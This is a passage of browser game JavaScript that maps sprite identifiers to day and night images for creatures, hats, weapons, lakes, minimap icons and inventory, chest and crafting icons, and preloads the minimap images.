      sprite[Ie.VULTURE_WING_LEFT_ATTACK][Ie.DAY] = IMAGES.VULTURE_WING_LEFT_ATTACKD;
      sprite[Ie.VULTURE_WING_LEFT_ATTACK][Ie.NIGHT] = IMAGES.VULTURE_WING_LEFT_ATTACKN;
      sprite[Ie.VULTURE_WING_RIGHT_ATTACK] = [];
      sprite[Ie.VULTURE_WING_RIGHT_ATTACK][Ie.DAY] = IMAGES.VULTURE_WING_RIGHT_ATTACKD;
      sprite[Ie.VULTURE_WING_RIGHT_ATTACK][Ie.NIGHT] = IMAGES.VULTURE_WING_RIGHT_ATTACKN;
      sprite[Ie.VULTURE_WING_LEFT_TAMED] = [];
      sprite[Ie.VULTURE_WING_LEFT_TAMED][Ie.DAY] = IMAGES.VULTURE_WING_LEFT_TAMEDD;
      sprite[Ie.VULTURE_WING_LEFT_TAMED][Ie.NIGHT] = IMAGES.VULTURE_WING_LEFT_TAMEDN;
      sprite[Ie.VULTURE_WING_RIGHT_TAMED] = [];
      sprite[Ie.VULTURE_WING_RIGHT_TAMED][Ie.DAY] = IMAGES.VULTURE_WING_RIGHT_TAMEDD;
      sprite[Ie.VULTURE_WING_RIGHT_TAMED][Ie.NIGHT] = IMAGES.VULTURE_WING_RIGHT_TAMEDN;
      sprite[Ie.HURT_VULTURE] = IMAGES.HURT_VULTURE;
      sprite[Ie.HURT_VULTURE_WING_LEFT] = IMAGES.HURT_VULTURE_WING_LEFT;
      sprite[Ie.HURT_VULTURE_WING_RIGHT] = IMAGES.HURT_VULTURE_WING_RIGHT;
      sprite[Ie.BOAR] = [];
      sprite[Ie.BOAR][Ie.DAY] = IMAGES.BOARD;
      sprite[Ie.BOAR][Ie.NIGHT] = IMAGES.BOARN;
      sprite[Ie.BOAR_TAMED] = [];
      sprite[Ie.BOAR_TAMED][Ie.DAY] = IMAGES.BOAR_TAMEDD;
      sprite[Ie.BOAR_TAMED][Ie.NIGHT] = IMAGES.BOAR_TAMEDN;
      sprite[Ie.BOAR_ATTACK] = [];
      sprite[Ie.BOAR_ATTACK][Ie.DAY] = IMAGES.BOAR_ANGRYD;
      sprite[Ie.BOAR_ATTACK][Ie.NIGHT] = IMAGES.BOAR_ANGRYN;
      sprite[Ie.BOAR_STEP] = [];
      sprite[Ie.BOAR_STEP][Ie.DAY] = IMAGES.BOAR_STEP;
      sprite[Ie.BOAR_STEP][Ie.NIGHT] = IMAGES.BOAR_STEP;
      sprite[Ie.CRAB_STEP] = [];
      sprite[Ie.CRAB_STEP][Ie.DAY] = IMAGES.CRAB_STEP;
      sprite[Ie.CRAB_STEP][Ie.NIGHT] = IMAGES.CRAB_STEP;
      sprite[Ie.BABY_MAMMOTH_STEP] = [];
      sprite[Ie.BABY_MAMMOTH_STEP][Ie.DAY] = IMAGES.BABY_MAMMOTH_STEP;
      sprite[Ie.BABY_MAMMOTH_STEP][Ie.NIGHT] = IMAGES.BABY_MAMMOTH_STEP;
      sprite[Ie.HURT_BOAR] = IMAGES.HURT_BOAR;
      sprite[Ie.SADDLE] = [];
      sprite[Ie.SADDLE][Ie.DAY] = IMAGES.SADDLED;
      sprite[Ie.SADDLE][Ie.NIGHT] = IMAGES.SADDLEN;
      sprite[Ie.WAND1] = [];
      sprite[Ie.WAND1][Ie.DAY] = IMAGES.WAND1D;
      sprite[Ie.WAND1][Ie.NIGHT] = IMAGES.WAND1N;
      sprite[Ie.SPELL] = [];
      sprite[Ie.SPELL][Ie.DAY] = [IMAGES.LIGHT_WAND0D, IMAGES.LIGHT_WAND1D, IMAGES.WOOD_ARROWD, IMAGES.STONE_ARROWD, IMAGES.GOLD_ARROWD, IMAGES.DIAMOND_ARROWD, IMAGES.AMETHYST_ARROWD, IMAGES.REIDITE_ARROWD, IMAGES.DRAGON_ARROWD];
      sprite[Ie.SPELL][Ie.NIGHT] = [IMAGES.LIGHT_WAND0N, IMAGES.LIGHT_WAND1N, IMAGES.WOOD_ARROWN, IMAGES.STONE_ARROWN, IMAGES.GOLD_ARROWN, IMAGES.DIAMOND_ARROWN, IMAGES.AMETHYST_ARROWN, IMAGES.REIDITE_ARROWD, IMAGES.DRAGON_ARROWN];
      sprite[Ie.WAND2] = [];
      sprite[Ie.WAND2][Ie.DAY] = IMAGES.WAND2D;
      sprite[Ie.WAND2][Ie.NIGHT] = IMAGES.WAND2N;
      sprite[Ie.BOAT_WAVE] = [];
      sprite[Ie.BOAT_WAVE][Ie.DAY] = IMAGES.BOAT_WAVED;
      sprite[Ie.BOAT_WAVE][Ie.NIGHT] = IMAGES.BOAT_WAVEN;
      sprite[Ie.SLED_WAVE] = [];
      sprite[Ie.SLED_WAVE][Ie.DAY] = IMAGES.SLED_WAVED;
      sprite[Ie.SLED_WAVE][Ie.NIGHT] = IMAGES.SLED_WAVEN;
      sprite[Ie.PIRATE_HAT] = [];
      sprite[Ie.PIRATE_HAT][Ie.DAY] = IMAGES.PIRATE_HATD;
      sprite[Ie.PIRATE_HAT][Ie.NIGHT] = IMAGES.PIRATE_HATN;
      sprite[Ie.FUR_HAT] = [];
      sprite[Ie.FUR_HAT][Ie.DAY] = IMAGES.FUR_HATD;
      sprite[Ie.FUR_HAT][Ie.NIGHT] = IMAGES.FUR_HATN;
      sprite[Ie.FLOWER_HAT] = [];
      sprite[Ie.FLOWER_HAT][Ie.DAY] = IMAGES.FLOWER_HATD;
      sprite[Ie.FLOWER_HAT][Ie.NIGHT] = IMAGES.FLOWER_HATN;
      sprite[Ie.PILOT_HELMET] = [];
      sprite[Ie.PILOT_HELMET][Ie.DAY] = IMAGES.PILOT_HELMETD;
      sprite[Ie.PILOT_HELMET][Ie.NIGHT] = IMAGES.PILOT_HELMETN;
      sprite[Ie.LAKE_EDGE] = [];
      sprite[Ie.LAKE_EDGE][Ie.DAY] = [];
      sprite[Ie.LAKE_EDGE][Ie.NIGHT] = [];
      sprite[Ie.LAKE_EDGE][Ie.DAY].push(IMAGES.LAKE0D_EDGE);
      sprite[Ie.LAKE_EDGE][Ie.DAY].push(IMAGES.LAKE1D_EDGE);
      sprite[Ie.LAKE_EDGE][Ie.DAY].push(IMAGES.LAKE2D_EDGE);
      sprite[Ie.LAKE_EDGE][Ie.NIGHT].push(IMAGES.LAKE0N_EDGE);
      sprite[Ie.LAKE_EDGE][Ie.NIGHT].push(IMAGES.LAKE1N_EDGE);
      sprite[Ie.LAKE_EDGE][Ie.NIGHT].push(IMAGES.LAKE2N_EDGE);
      sprite[Ie.LAKE_DEEP] = [];
      sprite[Ie.LAKE_DEEP][Ie.DAY] = [];
      sprite[Ie.LAKE_DEEP][Ie.NIGHT] = [];
      sprite[Ie.LAKE_DEEP][Ie.DAY].push(IMAGES.LAKE0D_DEEP);
      sprite[Ie.LAKE_DEEP][Ie.DAY].push(IMAGES.LAKE1D_DEEP);
      sprite[Ie.LAKE_DEEP][Ie.DAY].push(IMAGES.LAKE2D_DEEP);
      sprite[Ie.LAKE_DEEP][Ie.NIGHT].push(IMAGES.LAKE0N_DEEP);
      sprite[Ie.LAKE_DEEP][Ie.NIGHT].push(IMAGES.LAKE1N_DEEP);
      sprite[Ie.LAKE_DEEP][Ie.NIGHT].push(IMAGES.LAKE2N_DEEP);
      sprite[Ie.LAKE] = [];
      sprite[Ie.LAKE][Ie.DAY] = [];
      sprite[Ie.LAKE][Ie.NIGHT] = [];
      sprite[Ie.LAKE][Ie.DAY].push(IMAGES.LAKE0D);
      sprite[Ie.LAKE][Ie.DAY].push(IMAGES.LAKE1D);
      sprite[Ie.LAKE][Ie.DAY].push(IMAGES.LAKE2D);
      sprite[Ie.LAKE][Ie.NIGHT].push(IMAGES.LAKE0N);
      sprite[Ie.LAKE][Ie.NIGHT].push(IMAGES.LAKE1N);
      sprite[Ie.LAKE][Ie.NIGHT].push(IMAGES.LAKE2N);
      MINIMAP_UTILS.g = [];
      MINIMAP_UTILS.g[0] = [IMAGES.MAPDAY_GOLD1, IMAGES.MAPNIGHT_GOLD1];
      MINIMAP_UTILS.g[1] = MINIMAP_UTILS.g[0];
      MINIMAP_UTILS.g[2] = [IMAGES.MAPDAY_GOLD2, IMAGES.MAPNIGHT_GOLD2];
      MINIMAP_UTILS.m = [];
      MINIMAP_UTILS.m[0] = [IMAGES.MAPDAY_EMERALD1, IMAGES.MAPNIGHT_EMERALD1];
      MINIMAP_UTILS.m[1] = MINIMAP_UTILS.m[0];
      MINIMAP_UTILS.m[2] = [IMAGES.MAPDAY_EMERALD2, IMAGES.MAPNIGHT_EMERALD2];
      MINIMAP_UTILS.la = [];
      MINIMAP_UTILS.la[0] = [IMAGES.MAPDAY_MAGMA, IMAGES.MAPNIGHT_MAGMA];
      MINIMAP_UTILS.la[1] = MINIMAP_UTILS.la[0];
      MINIMAP_UTILS.la[2] = MINIMAP_UTILS.la[0];
      MINIMAP_UTILS.la[3] = MINIMAP_UTILS.la[0];
      MINIMAP_UTILS.la[4] = MINIMAP_UTILS.la[0];
      MINIMAP_UTILS.la[5] = MINIMAP_UTILS.la[0];
      MINIMAP_UTILS.s = [];
      MINIMAP_UTILS.s[0] = [IMAGES.MAPDAY_STONE1, IMAGES.MAPNIGHT_STONE1];
      MINIMAP_UTILS.s[1] = MINIMAP_UTILS.s[0];
      MINIMAP_UTILS.s[2] = [IMAGES.MAPDAY_STONE2, IMAGES.MAPNIGHT_STONE2];
      MINIMAP_UTILS.p = [];
      MINIMAP_UTILS.p[0] = [IMAGES.MAPDAY_BERRY, IMAGES.MAPDAY_BERRY];
      MINIMAP_UTILS.a = [];
      MINIMAP_UTILS.a[0] = [IMAGES.MAPDAY_AMETHYST, IMAGES.MAPNIGHT_AMETHYST];
      MINIMAP_UTILS.a[1] = MINIMAP_UTILS.a[0];
      MINIMAP_UTILS.a[2] = MINIMAP_UTILS.a[0];
      MINIMAP_UTILS.d = [];
      MINIMAP_UTILS.d[0] = [IMAGES.MAPDAY_DIAMOND, IMAGES.MAPNIGHT_DIAMOND];
      MINIMAP_UTILS.d[1] = MINIMAP_UTILS.d[0];
      MINIMAP_UTILS.d[2] = MINIMAP_UTILS.d[0];
      MINIMAP_UTILS.re = [];
      MINIMAP_UTILS.re[0] = [IMAGES.MAPDAY_REIDITE, IMAGES.MAPNIGHT_REIDITE];
      MINIMAP_UTILS.re[1] = MINIMAP_UTILS.re[0];
      MINIMAP_UTILS.re[2] = MINIMAP_UTILS.re[0];
      MINIMAP_UTILS.f = [];
      MINIMAP_UTILS.f[0] = [IMAGES.MAPDAY_FIR_TREE, IMAGES.MAPNIGHT_FIR_TREE];
      MINIMAP_UTILS.f[1] = MINIMAP_UTILS.f[0];
      MINIMAP_UTILS.f[2] = MINIMAP_UTILS.f[0];
      MINIMAP_UTILS.isl = [];
      MINIMAP_UTILS.isl[0] = [IMAGES.MAPDAY_ISLAND, IMAGES.MAPNIGHT_ISLAND];
      MINIMAP_UTILS.isl[1] = MINIMAP_UTILS.isl[0];
      MINIMAP_UTILS.isl[2] = MINIMAP_UTILS.isl[0];
      MINIMAP_UTILS.c = [];
      MINIMAP_UTILS.c[0] = [IMAGES.MAPDAY_CACTUS, IMAGES.MAPNIGHT_CACTUS];
      MINIMAP_UTILS.c[1] = MINIMAP_UTILS.c[0];
      MINIMAP_UTILS.c[2] = MINIMAP_UTILS.c[0];
      MINIMAP_UTILS.wtb = [];
      MINIMAP_UTILS.wtb[0] = [IMAGES.MAPDAY_RIVER, IMAGES.MAPNIGHT_RIVER];
      MINIMAP_UTILS.PIRANHA = [IMAGES.MAPDAY_PIRANHA, IMAGES.MAPNIGHT_PIRANHA];
      MINIMAP_UTILS.KRAKEN = [IMAGES.MAPDAY_KRAKEN, IMAGES.MAPNIGHT_KRAKEN];
      MINIMAP_UTILS.FOX = [IMAGES.MAPDAY_FOX, IMAGES.MAPNIGHT_FOX];
      MINIMAP_UTILS.WOLF = [IMAGES.MAPDAY_WOLF, IMAGES.MAPNIGHT_WOLF];
      MINIMAP_UTILS.SPIDER = [IMAGES.MAPDAY_SPIDER, IMAGES.MAPNIGHT_SPIDER];
      MINIMAP_UTILS.BEAR = [IMAGES.MAPDAY_BEAR, IMAGES.MAPNIGHT_BEAR];
      MINIMAP_UTILS.CAVE = [IMAGES.MAPDAY_CAVE, IMAGES.MAPNIGHT_CAVE];
      MINIMAP_UTILS.MAP = [IMAGES.BIGDAY, IMAGES.BIGNIGHT];
      MINIMAP_UTILS.FOREST = [IMAGES.MAPDAY_FOREST, IMAGES.MAPNIGHT_FOREST];
      MINIMAP_UTILS.WINTER = [IMAGES.MAPDAY_WINTER, IMAGES.MAPNIGHT_WINTER];
      MINIMAP_UTILS.DESERT = [IMAGES.MAPDAY_DESERT, IMAGES.MAPNIGHT_DESERT];
      MINIMAP_UTILS.LAVA = [IMAGES.MAPDAY_LAVA, IMAGES.MAPNIGHT_LAVA];
      for (var r in MINIMAP_UTILS) {
        for (var n = MINIMAP_UTILS[r], a = 0; a < n.length; a++) {
          var o = n[a];
          if (o.tryLoad !== undefined) {
            o.tryLoad();
          } else if (o.length > 0) {
            for (var s = 0; s < o.length; s++) {
              if (o[s].tryLoad !== undefined) {
                o[s].tryLoad();
              }
            }
          }
        }
      }
      console.log("Load images", Date.now() - e);
    }
    function gn() {
      var e = new Date().getTime();
      Rn();
      (function () {
        sprite[Ie.INV_PUMPKIN] = ci(1, [{
          f: $r,
          x: 0,
          y: 0,
          a: 1,
          r: 0,
          c: ["#352b10", "#c06937", "#cd733b", "#b25e34", "#244e2b", "#214224", "#6f4424", "#3c3009"]
        }], 0.2, ["#3ba578", "#4eb687", "#3da34d"], 0.5);
        sprite[Ie.CHEST_PUMPKIN] = sprite[Ie.INV_PUMPKIN];
        sprite[Ie.INV_CARROT] = [];
        sprite[Ie.INV_CARROT][0] = IMAGES.INV_CARROT_OUT;
        sprite[Ie.INV_CARROT][1] = IMAGES.INV_CARROT_IN;
        sprite[Ie.INV_CARROT][2] = IMAGES.INV_CARROT_CLICK;
        sprite[Ie.CHEST_CARROT] = sprite[Ie.INV_CARROT];
        sprite[Ie.INV_WATERMELON] = [];
        sprite[Ie.INV_WATERMELON][0] = IMAGES.INV_WATERMELON_OUT;
        sprite[Ie.INV_WATERMELON][1] = IMAGES.INV_WATERMELON_IN;
        sprite[Ie.INV_WATERMELON][2] = IMAGES.INV_WATERMELON_CLICK;
        sprite[Ie.CHEST_WATERMELON] = sprite[Ie.INV_WATERMELON];
        sprite[Ie.INV_ALOE_VERA] = [];
        sprite[Ie.INV_ALOE_VERA][0] = IMAGES.INV_ALOE_VERA_OUT;
        sprite[Ie.INV_ALOE_VERA][1] = IMAGES.INV_ALOE_VERA_IN;
        sprite[Ie.INV_ALOE_VERA][2] = IMAGES.INV_ALOE_VERA_CLICK;
        sprite[Ie.CHEST_ALOE_VERA] = sprite[Ie.INV_ALOE_VERA];
        sprite[Ie.INV_CACTUS] = [];
        sprite[Ie.INV_CACTUS][0] = IMAGES.INV_CACTUS_OUT;
        sprite[Ie.INV_CACTUS][1] = IMAGES.INV_CACTUS_IN;
        sprite[Ie.INV_CACTUS][2] = IMAGES.INV_CACTUS_CLICK;
        sprite[Ie.CHEST_CACTUS] = sprite[Ie.INV_CACTUS];
        sprite[Ie.INV_TOMATO] = [];
        sprite[Ie.INV_TOMATO][0] = IMAGES.INV_TOMATO_OUT;
        sprite[Ie.INV_TOMATO][1] = IMAGES.INV_TOMATO_IN;
        sprite[Ie.INV_TOMATO][2] = IMAGES.INV_TOMATO_CLICK;
        sprite[Ie.CHEST_TOMATO] = sprite[Ie.INV_TOMATO];
        sprite[Ie.INV_BOAT] = [];
        sprite[Ie.INV_BOAT][0] = IMAGES.INV_BOAT_OUT;
        sprite[Ie.INV_BOAT][1] = IMAGES.INV_BOAT_IN;
        sprite[Ie.INV_BOAT][2] = IMAGES.INV_BOAT_CLICK;
        sprite[Ie.CHEST_BOAT] = sprite[Ie.INV_BOAT];
        sprite[Ie.CRAFT_BOAT] = sprite[Ie.INV_BOAT];
        sprite[Ie.INV_MACHETE] = [];
        sprite[Ie.INV_MACHETE][0] = IMAGES.INV_MACHETE_OUT;
        sprite[Ie.INV_MACHETE][1] = IMAGES.INV_MACHETE_IN;
        sprite[Ie.INV_MACHETE][2] = IMAGES.INV_MACHETE_CLICK;
        sprite[Ie.CHEST_MACHETE] = sprite[Ie.INV_MACHETE];
        sprite[Ie.CRAFT_MACHETE] = sprite[Ie.INV_MACHETE];
        sprite[Ie.INV_SLED] = [];
        sprite[Ie.INV_SLED][0] = IMAGES.INV_SLED_OUT;
        sprite[Ie.INV_SLED][1] = IMAGES.INV_SLED_IN;
        sprite[Ie.INV_SLED][2] = IMAGES.INV_SLED_CLICK;
        sprite[Ie.CHEST_SLED] = sprite[Ie.INV_SLED];
        sprite[Ie.CRAFT_SLED] = sprite[Ie.INV_SLED];
        sprite[Ie.INV_PIRATE_HAT] = [];
        sprite[Ie.INV_PIRATE_HAT][0] = IMAGES.INV_PIRATE_HAT_OUT;
        sprite[Ie.INV_PIRATE_HAT][1] = IMAGES.INV_PIRATE_HAT_IN;
        sprite[Ie.INV_PIRATE_HAT][2] = IMAGES.INV_PIRATE_HAT_CLICK;
        sprite[Ie.CHEST_PIRATE_HAT] = sprite[Ie.INV_PIRATE_HAT];
        sprite[Ie.CRAFT_PIRATE_HAT] = sprite[Ie.INV_PIRATE_HAT];
        sprite[Ie.INV_FUR_MAMMOTH] = [];
        sprite[Ie.INV_FUR_MAMMOTH][0] = IMAGES.INV_FUR_MAMMOTH_OUT;
        sprite[Ie.INV_FUR_MAMMOTH][1] = IMAGES.INV_FUR_MAMMOTH_IN;
        sprite[Ie.INV_FUR_MAMMOTH][2] = IMAGES.INV_FUR_MAMMOTH_CLICK;
        sprite[Ie.CHEST_FUR_MAMMOTH] = sprite[Ie.INV_FUR_MAMMOTH];
        sprite[Ie.INV_FUR_HAT] = [];
        sprite[Ie.INV_FUR_HAT][0] = IMAGES.INV_FUR_HAT_OUT;
        sprite[Ie.INV_FUR_HAT][1] = IMAGES.INV_FUR_HAT_IN;
        sprite[Ie.INV_FUR_HAT][2] = IMAGES.INV_FUR_HAT_CLICK;
        sprite[Ie.CHEST_FUR_HAT] = sprite[Ie.INV_FUR_HAT];
        sprite[Ie.CRAFT_FUR_HAT] = sprite[Ie.INV_FUR_HAT];
        sprite[Ie.INV_WOOD_BOW] = [];
        sprite[Ie.INV_WOOD_BOW][0] = IMAGES.INV_WOOD_BOW_OUT;
        sprite[Ie.INV_WOOD_BOW][1] = IMAGES.INV_WOOD_BOW_IN;
        sprite[Ie.INV_WOOD_BOW][2] = IMAGES.INV_WOOD_BOW_CLICK;
        sprite[Ie.CHEST_WOOD_BOW] = sprite[Ie.INV_WOOD_BOW];
        sprite[Ie.CRAFT_WOOD_BOW] = sprite[Ie.INV_WOOD_BOW];
        sprite[Ie.INV_WOOD_ARROW] = [];
        sprite[Ie.INV_WOOD_ARROW][0] = IMAGES.INV_WOOD_ARROW_OUT;
        sprite[Ie.INV_WOOD_ARROW][1] = IMAGES.INV_WOOD_ARROW_IN;
        sprite[Ie.INV_WOOD_ARROW][2] = IMAGES.INV_WOOD_ARROW_CLICK;
        sprite[Ie.CHEST_WOOD_ARROW] = sprite[Ie.INV_WOOD_ARROW];
        sprite[Ie.CRAFT_WOOD_ARROW] = sprite[Ie.INV_WOOD_ARROW];
        sprite[Ie.INV_STONE_BOW] = [];
        sprite[Ie.INV_STONE_BOW][0] = IMAGES.INV_STONE_BOW_OUT;
        sprite[Ie.INV_STONE_BOW][1] = IMAGES.INV_STONE_BOW_IN;
        sprite[Ie.INV_STONE_BOW][2] = IMAGES.INV_STONE_BOW_CLICK;
        sprite[Ie.CHEST_STONE_BOW] = sprite[Ie.INV_STONE_BOW];
        sprite[Ie.CRAFT_STONE_BOW] = sprite[Ie.INV_STONE_BOW];
        sprite[Ie.INV_STONE_ARROW] = [];
        sprite[Ie.INV_STONE_ARROW][0] = IMAGES.INV_STONE_ARROW_OUT;
        sprite[Ie.INV_STONE_ARROW][1] = IMAGES.INV_STONE_ARROW_IN;
        sprite[Ie.INV_STONE_ARROW][2] = IMAGES.INV_STONE_ARROW_CLICK;
        sprite[Ie.CHEST_STONE_ARROW] = sprite[Ie.INV_STONE_ARROW];
        sprite[Ie.CRAFT_STONE_ARROW] = sprite[Ie.INV_STONE_ARROW];
        sprite[Ie.INV_GOLD_BOW] = [];
        sprite[Ie.INV_GOLD_BOW][0] = IMAGES.INV_GOLD_BOW_OUT;
        sprite[Ie.INV_GOLD_BOW][1] = IMAGES.INV_GOLD_BOW_IN;
        sprite[Ie.INV_GOLD_BOW][2] = IMAGES.INV_GOLD_BOW_CLICK;
        sprite[Ie.CHEST_GOLD_BOW] = sprite[Ie.INV_GOLD_BOW];
        sprite[Ie.CRAFT_GOLD_BOW] = sprite[Ie.INV_GOLD_BOW];
        sprite[Ie.INV_GOLD_ARROW] = [];
        sprite[Ie.INV_GOLD_ARROW][0] = IMAGES.INV_GOLD_ARROW_OUT;
        sprite[Ie.INV_GOLD_ARROW][1] = IMAGES.INV_GOLD_ARROW_IN;
        sprite[Ie.INV_GOLD_ARROW][2] = IMAGES.INV_GOLD_ARROW_CLICK;
        sprite[Ie.CHEST_GOLD_ARROW] = sprite[Ie.INV_GOLD_ARROW];
        sprite[Ie.CRAFT_GOLD_ARROW] = sprite[Ie.INV_GOLD_ARROW];
        sprite[Ie.INV_DIAMOND_BOW] = [];
        sprite[Ie.INV_DIAMOND_BOW][0] = IMAGES.INV_DIAMOND_BOW_OUT;
        sprite[Ie.INV_DIAMOND_BOW][1] = IMAGES.INV_DIAMOND_BOW_IN;
        sprite[Ie.INV_DIAMOND_BOW][2] = IMAGES.INV_DIAMOND_BOW_CLICK;
        sprite[Ie.CHEST_DIAMOND_BOW] = sprite[Ie.INV_DIAMOND_BOW];
        sprite[Ie.CRAFT_DIAMOND_BOW] = sprite[Ie.INV_DIAMOND_BOW];
        sprite[Ie.INV_DIAMOND_ARROW] = [];
        sprite[Ie.INV_DIAMOND_ARROW][0] = IMAGES.INV_DIAMOND_ARROW_OUT;
        sprite[Ie.INV_DIAMOND_ARROW][1] = IMAGES.INV_DIAMOND_ARROW_IN;
        sprite[Ie.INV_DIAMOND_ARROW][2] = IMAGES.INV_DIAMOND_ARROW_CLICK;
        sprite[Ie.CHEST_DIAMOND_ARROW] = sprite[Ie.INV_DIAMOND_ARROW];
        sprite[Ie.CRAFT_DIAMOND_ARROW] = sprite[Ie.INV_DIAMOND_ARROW];
        sprite[Ie.INV_AMETHYST_BOW] = [];
        sprite[Ie.INV_AMETHYST_BOW][0] = IMAGES.INV_AMETHYST_BOW_OUT;
        sprite[Ie.INV_AMETHYST_BOW][1] = IMAGES.INV_AMETHYST_BOW_IN;
        sprite[Ie.INV_AMETHYST_BOW][2] = IMAGES.INV_AMETHYST_BOW_CLICK;
        sprite[Ie.CHEST_AMETHYST_BOW] = sprite[Ie.INV_AMETHYST_BOW];
        sprite[Ie.CRAFT_AMETHYST_BOW] = sprite[Ie.INV_AMETHYST_BOW];
        sprite[Ie.INV_AMETHYST_ARROW] = [];
        sprite[Ie.INV_AMETHYST_ARROW][0] = IMAGES.INV_AMETHYST_ARROW_OUT;
        sprite[Ie.INV_AMETHYST_ARROW][1] = IMAGES.INV_AMETHYST_ARROW_IN;
        sprite[Ie.INV_AMETHYST_ARROW][2] = IMAGES.INV_AMETHYST_ARROW_CLICK;
        sprite[Ie.CHEST_AMETHYST_ARROW] = sprite[Ie.INV_AMETHYST_ARROW];
        sprite[Ie.CRAFT_AMETHYST_ARROW] = sprite[Ie.INV_AMETHYST_ARROW];
        sprite[Ie.INV_REIDITE_BOW] = [];
        sprite[Ie.INV_REIDITE_BOW][0] = IMAGES.INV_REIDITE_BOW_OUT;
        sprite[Ie.INV_REIDITE_BOW][1] = IMAGES.INV_REIDITE_BOW_IN;
        sprite[Ie.INV_REIDITE_BOW][2] = IMAGES.INV_REIDITE_BOW_CLICK;
        sprite[Ie.CHEST_REIDITE_BOW] = sprite[Ie.INV_REIDITE_BOW];
        sprite[Ie.CRAFT_REIDITE_BOW] = sprite[Ie.INV_REIDITE_BOW];
        sprite[Ie.INV_REIDITE_ARROW] = [];
        sprite[Ie.INV_REIDITE_ARROW][0] = IMAGES.INV_REIDITE_ARROW_OUT;
        sprite[Ie.INV_REIDITE_ARROW][1] = IMAGES.INV_REIDITE_ARROW_IN;
        sprite[Ie.INV_REIDITE_ARROW][2] = IMAGES.INV_REIDITE_ARROW_CLICK;
        sprite[Ie.CHEST_REIDITE_ARROW] = sprite[Ie.INV_REIDITE_ARROW];
        sprite[Ie.CRAFT_REIDITE_ARROW] = sprite[Ie.INV_REIDITE_ARROW];
        sprite[Ie.INV_DRAGON_BOW] = [];
        sprite[Ie.INV_DRAGON_BOW][0] = IMAGES.INV_DRAGON_BOW_OUT;
        sprite[Ie.INV_DRAGON_BOW][1] = IMAGES.INV_DRAGON_BOW_IN;
        sprite[Ie.INV_DRAGON_BOW][2] = IMAGES.INV_DRAGON_BOW_CLICK;
        sprite[Ie.CHEST_DRAGON_BOW] = sprite[Ie.INV_DRAGON_BOW];
        sprite[Ie.CRAFT_DRAGON_BOW] = sprite[Ie.INV_DRAGON_BOW];
        sprite[Ie.INV_DRAGON_ARROW] = [];
        sprite[Ie.INV_DRAGON_ARROW][0] = IMAGES.INV_DRAGON_ARROW_OUT;
        sprite[Ie.INV_DRAGON_ARROW][1] = IMAGES.INV_DRAGON_ARROW_IN;
        sprite[Ie.INV_DRAGON_ARROW][2] = IMAGES.INV_DRAGON_ARROW_CLICK;
        sprite[Ie.CHEST_DRAGON_ARROW] = sprite[Ie.INV_DRAGON_ARROW];
        sprite[Ie.CRAFT_DRAGON_ARROW] = sprite[Ie.INV_DRAGON_ARROW];
        sprite[Ie.INV_WOOD_SHIELD] = [];
        sprite[Ie.INV_WOOD_SHIELD][0] = IMAGES.INV_WOOD_SHIELD_OUT;
        sprite[Ie.INV_WOOD_SHIELD][1] = IMAGES.INV_WOOD_SHIELD_IN;
        sprite[Ie.INV_WOOD_SHIELD][2] = IMAGES.INV_WOOD_SHIELD_CLICK;
        sprite[Ie.CHEST_WOOD_SHIELD] = sprite[Ie.INV_WOOD_SHIELD];
        sprite[Ie.CRAFT_WOOD_SHIELD] = sprite[Ie.INV_WOOD_SHIELD];
        sprite[Ie.INV_STONE_SHIELD] = [];
        sprite[Ie.INV_STONE_SHIELD][0] = IMAGES.INV_STONE_SHIELD_OUT;
        sprite[Ie.INV_STONE_SHIELD][1] = IMAGES.INV_STONE_SHIELD_IN;
        sprite[Ie.INV_STONE_SHIELD][2] = IMAGES.INV_STONE_SHIELD_CLICK;
        sprite[Ie.CHEST_STONE_SHIELD] = sprite[Ie.INV_STONE_SHIELD];
        sprite[Ie.CRAFT_STONE_SHIELD] = sprite[Ie.INV_STONE_SHIELD];
        sprite[Ie.INV_GOLD_SHIELD] = [];
        sprite[Ie.INV_GOLD_SHIELD][0] = IMAGES.INV_GOLD_SHIELD_OUT;
        sprite[Ie.INV_GOLD_SHIELD][1] = IMAGES.INV_GOLD_SHIELD_IN;
        sprite[Ie.INV_GOLD_SHIELD][2] = IMAGES.INV_GOLD_SHIELD_CLICK;
        sprite[Ie.CHEST_GOLD_SHIELD] = sprite[Ie.INV_GOLD_SHIELD];
        sprite[Ie.CRAFT_GOLD_SHIELD] = sprite[Ie.INV_GOLD_SHIELD];
        sprite[Ie.INV_DIAMOND_SHIELD] = [];
        sprite[Ie.INV_DIAMOND_SHIELD][0] = IMAGES.INV_DIAMOND_SHIELD_OUT;
        sprite[Ie.INV_DIAMOND_SHIELD][1] = IMAGES.INV_DIAMOND_SHIELD_IN;
        sprite[Ie.INV_DIAMOND_SHIELD][2] = IMAGES.INV_DIAMOND_SHIELD_CLICK;
        sprite[Ie.CHEST_DIAMOND_SHIELD] = sprite[Ie.INV_DIAMOND_SHIELD];
        sprite[Ie.CRAFT_DIAMOND_SHIELD] = sprite[Ie.INV_DIAMOND_SHIELD];
        sprite[Ie.INV_AMETHYST_SHIELD] = [];
        sprite[Ie.INV_AMETHYST_SHIELD][0] = IMAGES.INV_AMETHYST_SHIELD_OUT;
        sprite[Ie.INV_AMETHYST_SHIELD][1] = IMAGES.INV_AMETHYST_SHIELD_IN;
        sprite[Ie.INV_AMETHYST_SHIELD][2] = IMAGES.INV_AMETHYST_SHIELD_CLICK;
        sprite[Ie.CHEST_AMETHYST_SHIELD] = sprite[Ie.INV_AMETHYST_SHIELD];
        sprite[Ie.CRAFT_AMETHYST_SHIELD] = sprite[Ie.INV_AMETHYST_SHIELD];
        sprite[Ie.INV_REIDITE_SHIELD] = [];
        sprite[Ie.INV_REIDITE_SHIELD][0] = IMAGES.INV_REIDITE_SHIELD_OUT;
        sprite[Ie.INV_REIDITE_SHIELD][1] = IMAGES.INV_REIDITE_SHIELD_IN;
        sprite[Ie.INV_REIDITE_SHIELD][2] = IMAGES.INV_REIDITE_SHIELD_CLICK;
        sprite[Ie.CHEST_REIDITE_SHIELD] = sprite[Ie.INV_REIDITE_SHIELD];
        sprite[Ie.CRAFT_REIDITE_SHIELD] = sprite[Ie.INV_REIDITE_SHIELD];
        sprite[Ie.INV_FLOWER_HAT] = [];
        sprite[Ie.INV_FLOWER_HAT][0] = IMAGES.INV_FLOWER_HAT_OUT;
        sprite[Ie.INV_FLOWER_HAT][1] = IMAGES.INV_FLOWER_HAT_IN;
        sprite[Ie.INV_FLOWER_HAT][2] = IMAGES.INV_FLOWER_HAT_CLICK;
        sprite[Ie.CHEST_FLOWER_HAT] = sprite[Ie.INV_FLOWER_HAT];
        sprite[Ie.CRAFT_FLOWER_HAT] = sprite[Ie.INV_FLOWER_HAT];
